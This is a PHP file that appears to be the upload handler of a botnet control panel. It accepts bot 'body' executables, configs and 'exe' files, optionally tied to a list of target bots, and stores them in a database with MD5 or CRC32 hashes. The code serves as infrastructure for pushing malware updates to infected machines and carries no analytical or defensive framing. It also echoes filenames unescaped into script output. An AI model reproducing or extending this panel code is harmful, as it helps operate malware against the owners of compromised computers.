<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/files.php";
	include_once ROOT_PATH."/mod/functs.php";	
	if( !$user->Check() ) exit;
/*	
	if( isset($_POST['name']) || !count($_POST) ) 
	{ 
		$smarty->display('update_bot.tpl'); 
		die(); 
	}
*/
	$smarty->assign('DIR','../');
	$smarty->display('progress.tpl');
?>
<script>
<?
	if( !isset($_POST['uptype']) )
		die( "SetResult(\"<font class='error'>Data send error!</font>\");</script>" );
	$uptype = $_POST['uptype'];
	
	if ($_FILES['file']['tmp_name'] && ($_FILES['file']['size'] > 0)) 
	{
		$outstr = "<br>";
		set_time_limit(0);
	
		$filename = str_replace(" ","_",$_FILES['file']['name']);
		$ext = substr($filename, strrpos($filename, '.')+1);
		if( $ext==='bin' && $uptype!=='config' ) $outstr .= "<font class='error'>Bad CONFIG extension!</font><br>";
		if( $ext==='exe' && $uptype!=='body' && $uptype!=='exe' ) $outstr .= "<font class='error'>Bad extension!</font><br>";
		
		switch( $uptype )
		{
		case 'body': $ext = 'b'; break;
		case 'config': $ext = 'c'; break;
		case 'exe': $ext = 'e'; break;
		default: $ext = 'e';
		}
		$_SESSION['file_ext'] = $ext;
		
		if( isset($_POST['bots']) && trim($_POST['bots']) !== '')
		{
			$bots = explode(' ', trim($_POST['bots']));
			//writelog("debug.log", trim($_POST['bots'])); 
			$filename .= "_".(LastFileId()+1);
		}
		if( FileExist($filename) ) $filename .= LastFileId();
		
		$tmpName  = $_FILES['file']['tmp_name'];
		$fileSize = $_FILES['file']['size'];
		$fileType = $_FILES['file']['type'];
		
		## reading all file for calculating hash
		$fp = fopen($tmpName, 'r');
		$content = fread($fp, filesize($tmpName));
		if ( $uptype === 'config' ) 
			$md5 = GetCRC32($content);
		else $md5 = md5($content);
		unset($content);
		fclose($fp);

		if( filesize($tmpName) > 1000000 ) $db->query("SET max_allowed_packet=".(6*1024*1024)); // max query len = 6 Mb
		
		$first = true; $res = 0; $uploaded = 0;
		$fp = fopen($tmpName, 'r');
	
		while (!feof($fp)) 
		{
			$content = fread($fp, FRAG_SIZE);
			$cont = addslashes($content);
			$uploaded += strlen($content);
			unset($content);			
			if( $first )
			{
				$res = AddFile($filename, $cont, $md5, $ext);
				if ( $res ) 
				{
					$file_id = FileId($filename);
					$old_file_id = ContExist($file_id);
					$_SESSION['file_id'] = $old_file_id;
				}
				$first = false;
			}
			else $res = UpdateFile($filename, $cont);
			echo "r(".round($uploaded/$fileSize,2).");";			
			echo "</script>".str_repeat("\n",1024)."<script>";
			flush();			
			unset($cont);
		}		
		fclose($fp);

		if ( $res )
		{
			$file_id = FileId($filename);
			$old_file_id = ContExist($file_id);
			// если контент загружаемого файла существует - выводим сообщение
			if( $file_id != $old_file_id )
			{
				$file = GetFileById($old_file_id);
				// * удалить новый файл
				$sql = "DELETE FROM files_t WHERE fId=$file_id LIMIT 1";
				$db->query($sql);
				$outstr .= "<font class='error'>File already exists!</font> &nbsp;  Use <b>{$file['fName']}</b><br>";
				$outstr .= " Hash: <b>{$file['fMd5']}</b>&nbsp; File ID: <b>{$file['fId']}</b><br>";
			}
			else
			{
				if ( $uptype === 'config' ) $outstr .= "<b>Aha! Config</b> was uploaded! Oh you ... oh you ... ok. Forget it.<br>";
		
				$outstr .= 	"File <b>".basename($filename)."</b><font class='ok'> successfully</font> uploaded. <b>" . round($fileSize / 1024, 2) 
						." KB</b><br><b>".($uptype==='body' ? 'MD5' : 'CRC32')."</b> hash = $md5<br>";
				
			}

			echo "SetResult(\"$outstr\");r(1);</script>";
			flush();
		}
		else echo "SetResult('<font class=\"error\">Cannot</font> upload <b>$filename</b>');</script>";
	}
?>

